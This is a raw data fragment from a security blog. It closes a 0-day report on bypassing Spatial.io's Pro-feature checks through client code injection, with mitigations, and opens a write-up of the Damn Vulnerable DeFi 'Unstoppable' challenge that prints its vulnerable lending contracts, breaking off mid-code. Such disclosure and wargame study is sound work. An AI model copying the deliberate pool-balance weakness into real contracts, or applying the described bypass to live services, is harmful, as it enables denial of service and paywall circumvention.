because Client-side blocked the activation of the Pro function with the UI concept.</p>\n<p>UserProfile object check function (v) and return value for each object are modulated according to the data flow so that the final Host Settings function can be performed.</p>\n<h2 id=\"other-attachments-file\" style=\"position:relative;\"><a href=\"#other-attachments-file\" aria-label=\"other attachments file permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Other Attachments (File)</h2>\n<p><strong>Client Code Injection Vulnerability Pro Function Bypass Attack POC Video1</strong>\n<img src=\"/94668dfd9e7ad0f410509cfa00b7c95f/sdsdsds.gif\" alt=\"Exploit\"></p>\n<h2 id=\"any-additional-information\" style=\"position:relative;\"><a href=\"#any-additional-information\" aria-label=\"any additional information permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Any additional information?</h2>\n<h3 id=\"mitigation-1-client-code-injection-vulnerability-prevention-react-native-javascript-anti-reversing-proguard-obfuscation-and-reactnative-obfuscation\" style=\"position:relative;\"><a href=\"#mitigation-1-client-code-injection-vulnerability-prevention-react-native-javascript-anti-reversing-proguard-obfuscation-and-reactnative-obfuscation\" aria-label=\"mitigation 1 client code injection vulnerability prevention react native javascript anti reversing proguard obfuscation and reactnative obfuscation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation 1: Client Code Injection Vulnerability Prevention: React Native Javascript Anti Reversing Proguard obfuscation and ReactNative obfuscation?</h3>\n<ul>\n<li>Javascript obfuscation application is required using Proguard, which is a concept of reducing the size of code and resources, but can be prepared for application cracking by performing internal logic analysis during decompile.</li>\n<li>Use the <code class=\"language-text\">getJSBundleFile</code> method of the abstract class ReactNativeHost to modify the path of the bundle file and proceed in the following order to encrypt the index.android.bundle file</li>\n</ul>\n<h3 id=\"android-to-reactnativehosts-method\" style=\"position:relative;\"><a href=\"#android-to-reactnativehosts-method\" aria-label=\"android to reactnativehosts method permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Android to ReactNativeHosts Method</h3>\n<ul>\n<li>Within the MainApplication.java code, the onCreate method is called onCreate() when the corresponding component object is created on Android, so it is a good idea to perform bundle operations on the OnCreate method in the MainApplication.</li>\n<li>Use the <code class=\"language-text\">getJSBundleFile</code> method of the abstract class ReactNativeHost to modify the path of the bundle file and proceed in the following order to encrypt the index.android.bundle file.</li>\n</ul>\n<ol>\n<li>index.android.bundle custom file encryption</li>\n<li>eplace index.android.bundle.encfile and proceed with the compile and signature operation.</li>\n<li>In MainApplicationonCreate, encrypt the index.android.bundle file in the asset folder with index.android.bundle.enc.</li>\n<li>Decrypt the index.android.bundle.enc file into the External file folder and temporarily save it.</li>\n<li>Overload the getJSBundleFIle method so that the file can be loaded from React Native.</li>\n</ol>\n<ul>\n<li>The index.android.bundle source code should be obfuscated and encrypted in the following way so that it cannot be modified through actual anti-reversing technology.</li>\n</ul>\n<h3 id=\"mitigation-2-vulnerability-of-insufficient-server-profile-inspection\" style=\"position:relative;\"><a href=\"#mitigation-2-vulnerability-of-insufficient-server-profile-inspection\" aria-label=\"mitigation 2 vulnerability of insufficient server profile inspection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation 2: Vulnerability of insufficient server profile inspection</h3>\n<ul>\n<li>The server conducts a User Profile inspection on the user, manages the permissions and various sessions in the room, and performs some functions using third party api, but after the User Profile inspection, the attacker can bypass some functions through client injection.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n</li>\n<li>\n<p><a href=\"#summary-titile\">Summary Titile</a></p>\n</li>\n<li>\n<p><a href=\"#attack-type\">Attack Type</a></p>\n</li>\n<li>\n<p><a href=\"#attack-effect\">Attack Effect</a></p>\n</li>\n<li>\n<p><a href=\"#vulnerability-detected-location\">Vulnerability Detected Location</a></p>\n</li>\n<li>\n<p><a href=\"#attack-point\">Attack Point</a></p>\n</li>\n<li>\n<p><a href=\"#vulnerability-description\">Vulnerability Description</a></p>\n</li>\n<li>\n<p><a href=\"#react-native-javascript-interface-user-pro-function-check-logic-bypass\">React Native Javascript: Interface User Pro Function Check Logic Bypass</a></p>\n</li>\n<li>\n<p><a href=\"#vulnerability\">Vulnerability</a></p>\n<ul>\n<li><a href=\"#code-path-poc\">Code Path (POC)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#vulnerability-1\">Vulnerability</a></p>\n<ul>\n<li><a href=\"#code-path-poc-1\">Code Path (POC)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#vulnerability-2\">Vulnerability</a></p>\n<ul>\n<li><a href=\"#code-path-poc-2\">Code Path (POC)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#vulnerability-3\">Vulnerability</a></p>\n</li>\n<li>\n<p><a href=\"#vulnerability-4\">Vulnerability</a></p>\n</li>\n<li>\n<p><a href=\"#other-attachments-file\">Other Attachments (File)</a></p>\n</li>\n<li>\n<p><a href=\"#any-additional-information\">Any additional information?</a></p>\n<ul>\n<li><a href=\"#mitigation-1-client-code-injection-vulnerability-prevention-react-native-javascript-anti-reversing-proguard-obfuscation-and-reactnative-obfuscation\">Mitigation 1: Client Code Injection Vulnerability Prevention: React Native Javascript Anti Reversing Proguard obfuscation and ReactNative obfuscation?</a></li>\n<li><a href=\"#android-to-reactnativehosts-method\">Android to ReactNativeHosts Method</a></li>\n<li><a href=\"#mitigation-2-vulnerability-of-insufficient-server-profile-inspection\">Mitigation 2: Vulnerability of insufficient server profile inspection</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"July 10, 2022","title":"Spatial.io Commercial Service Feature Bypass 0-day Vulnerability Report","categories":"0-day","author":"Zer0Luck","emoji":"👻"},"fields":{"slug":"/spatial-dos/"}},"prev":{"id":"290fa8aa-801e-5258-9c39-b020e9110881","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACfElEQVQoz1WRSWsTYQCGv8w+005nsqeT2b6ZySTTrG2TaZqlaZsYTWqrpjZWbLRWjC2lYD2IUhBBBC3ighcv3jx40YOoaEH0opcKriCCInoQPPoHRNJ6EZ7r8x7eB1w9MdnMFziX1c1HWKfFOi3OHfUEki5f3BtIuXxxp7eDyxd3+5O8Oxqxp45cuF1tn9cq80ANhr1OAyVUhFAQQnXgMk5rvVLaL/TLWlaCQ71iOiCmg4qt6FlBTsczE42Vi3tOXrb2nwKOLQ2jIE5rGAUJWsMpiFMQJWE3HxE7zrCiD8swq4XyijYMQ/l4dsquzRulgwClNaynDyF0gEsoEwKoBHAFoDJwBAESBKgIHEEE76yTjI5TmsMhYBTEaI3hwqAvt6/ZXqvtXhzIN8YbS7XJdnnqeLm+UKnOFkan8yONav1QLFnBKAhAL0Wpdn8FoxSUhHR3CMiJ6sTMcmm8FctMZnfODRWauWprdMfcQKauR4pBOaOHi7wnxrChMLTrteWvb38ocAQgAstbwGsUosVpM1UXQ6VAou4J5q1kPTVY080cQigAFRFEBEDwCZnPD59u3n//6tmf5fYthFRJxgC8kvNYVR8c4/w2b1S94ojfHJNCJW8gRjA6Tms4raOk2uVKtI6tr196cvPa67OrdwLCEMAlsHj4zOmVK9MTq4I26rZ2CeqYzyyrZplzR2jWQEnYuYeCBKP7xWIydaBUmLcHmy73QBedBL+ef/j98vvHe++WWudEs8x5+mk2QrMmwWg4/c/cZjsh25WWe2YTzrWs6wbYvLvx7fGbnxtfHlx/FNZKABMxSkVJFaX+M7Gt8gxnRqWjM8aLhfCnvcrGX6mKfbw4qpSKAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"unstoppable-contract\"\n        title=\"unstoppable-contract\"\n        src=\"/static/576c503a2b54e25e3ee5f0c99ac34cb6/37523/c1.png\"\n        srcset=\"/static/576c503a2b54e25e3ee5f0c99ac34cb6/e9ff0/c1.png 180w,\n/static/576c503a2b54e25e3ee5f0c99ac34cb6/f21e7/c1.png 360w,\n/static/576c503a2b54e25e3ee5f0c99ac34cb6/37523/c1.png 720w,\n/static/576c503a2b54e25e3ee5f0c99ac34cb6/e996b/c1.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>Wargame Provider: @tinchoabbate</strong></p>\n<blockquote>\n<p>Challenge #1 — Unstoppable</p>\n</blockquote>\n<p>There’s a lending pool with a million DVT tokens in balance, offering flash loans for free.\nIf only there was a way to attack and stop the pool from offering flash loans …\nYou start with 100 DVT tokens in balance.</p>\n<h2 id=\"code-audit\" style=\"position:relative;\"><a href=\"#code-audit\" aria-label=\"code audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Audit</h2>\n<blockquote>\n<p>UnstoppableLender.sol</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">DamnValuableToken</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DamnValuableToken\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"DVT\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IReceiver</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">UnstoppableLender</span> <span class=\"token keyword\">is</span> ReentrancyGuard <span class=\"token punctuation\">{</span>\n\n    IERC20 <span class=\"token keyword\">public</span> immutable damnValuableToken<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> poolBalance<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>tokenAddress <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Token address cannot be zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        damnValuableToken <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">depositTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Must deposit at least one token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// Transfer token from sender. Sender must have first approved them.</span>\n        damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        poolBalance <span class=\"token operator\">=</span> poolBalance <span class=\"token operator\">+</span> amount<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>borrowAmount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Must borrow at least one token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> balanceBefore <span class=\"token operator\">=</span> damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceBefore <span class=\"token operator\">>=</span> borrowAmount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough tokens in pool\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>poolBalance <span class=\"token operator\">==</span> balanceBefore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token function\">IReceiver</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>damnValuableToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token builtin\">uint256</span> balanceAfter <span class=\"token operator\">=</span> damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceAfter <span class=\"token operator\">>=</span> balanceBefore<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Flash loan hasn't been paid back\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"quick-security-check\" style=\"position:relative;\"><a href=\"#quick-security-check\" aria-label=\"quick security check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Quick Security Check</h3>\n<p>By using the ReentrancyGuardcontract, <code class=\"language-text\">ReentrancyGuard’s</code> nonReentrant Modifier is applied to the internal functions of the main contract to prevent reentrancy calls from occurring.</p>\n<h3 id=\"state-variables\" style=\"position:relative;\"><a href=\"#state-variables\" aria-label=\"state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variables</h3>\n<p>Two State Variables are being used. The damnValuableToken variable is assigned as an IERC20 token. The <code class=\"language-text\">poolBalanc</code> evariable is used as the flashLoan pool within the contract.</p>\n<h3 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<ul>\n<li>\n<p>You can see that the constructor sets token address as a factor of address type.</p>\n</li>\n<li>\n<p>Let’s check the function. <code class=\"language-text\">depositTokens(uint256 amount) external nonReentrant</code></p>\n</li>\n<li>\n<p>When proceeding to this contract based on passing the condition that the amount value must be greater than 0, by default, the amount must be transferred with a positive value.</p>\n</li>\n<li>\n<p>Call the token contract function <code class=\"language-text\">transferFrom</code> and send to this contract in balance as much as the value of the variable</p>\n</li>\n<li>\n<p>Finally, add the value of the amount sent to the <code class=\"language-text\">poolBalance</code> value.</p>\n</li>\n</ul>\n<p>Let’s check the function. <code class=\"language-text\">flashLoan(uint256 borrowAmount) external nonReentrant</code></p>\n<ul>\n<li>Depending on the value of the <code class=\"language-text\">borrowAmount</code> parameter, you can take out a loan from the balance deposited in the contract pool.</li>\n<li>You can see various Error Handling patterns. The <code class=\"language-text\">borrowAmount</code> value must be greater than zero, which can be borrowed from the minimum positive value of 1.you can get a loan from the balance deposited in the contract pool.</li>\n<li>BalanceBefore Local Variable is assigned the Current Contract Balance. Must be greater than or equal to the value of browAmount. The value you want to borrow must not exceed the Contract Balance value.</li>\n<li>In code <code class=\"language-text\">assert(poolBalance==balanceBefore)</code> ErrorHandling, the value of the poolBalance variable must be the same as the value of the balanceBefore variable. This condition is because the value of the poolBalance variable was updated by depositing the balance to this contract in the depositTokens function and adding the value of the poolBalance variable to the value of the amount variable.</li>\n<li>Send the value of the <code class=\"language-text\">browAmount</code> variable to <code class=\"language-text\">msg.sender</code> using the <code class=\"language-text\">transfer</code> function. (This section completes the transfer.)</li>\n<li><code class=\"language-text\">IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount)</code> Transfer the token’s address value and loan balance value to the receiver Tokens function defined in the external contract to proceed with loan repayment. After completing the loan, this Contract Current Balance compares the values of the previous Balance to complete the flashloan operation.</li>\n</ul>\n<blockquote>\n<p>ReceiverUnstoppable.sol</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../unstoppable/UnstoppableLender.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">ReceiverUnstoppable</span> <span class=\"token punctuation\">{</span>\n\n    UnstoppableLender <span class=\"token keyword\">private</span> immutable pool<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> immutable owner<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> poolAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        pool <span class=\"token operator\">=</span> <span class=\"token function\">UnstoppableLender</span><span class=\"token punctuation\">(</span>poolAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Sender must be pool\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Transfer of tokens failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">executeFlashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Only owner can execute flash loan\"</span><span class=\"token 